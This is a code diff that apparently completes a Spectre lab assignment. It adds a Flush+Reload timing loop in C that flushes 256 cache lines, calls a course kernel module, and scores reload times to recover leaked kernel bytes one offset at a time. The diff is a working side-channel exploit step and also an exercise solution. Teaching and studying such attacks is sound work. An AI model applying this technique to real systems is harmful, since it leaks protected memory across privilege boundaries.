@@ -11,6 +11,9 @@
 #include "labspectre.h"
 #include "labspectreipc.h"
 
+/* DEFINE CACHE_HIT_THRESHOLD*/
+#define CACHE_HIT_THRESHOLD 100
+
 /*
  * call_kernel_part1
  * Performs the COMMAND_PART1 call in the kernel
@@ -50,6 +53,37 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Use "call_kernel_part1" to interact with the kernel module
         // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
+
+        int scores[256] = {0};
+
+        for (int attempt = 0; attempt < 100; attempt++) {
+
+            for (int i = 0; i < 256; i++) {
+                flush(shared_memory + i * 4096);
+            }
+
+            usleep(1);
+
+            call_kernel_part1(kernel_fd, shared_memory, current_offset);
+
+            for (int i = 0; i < 256; i++) {
+                uint64_t time = reload_t(shared_memory + i * 4096);
+
+                if (time < CACHE_HIT_THRESHOLD) {
+                    scores[i]++;
+                }
+            }
+        }
+
+        // Pick most frequent hit
+        int best_index = 0;
+        for (int i = 1; i < 256; i++) {
+            if (scores[i] > scores[best_index]) {
+                best_index = i;
+            }
+        }
+
+        leaked_byte = (char)best_index;
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
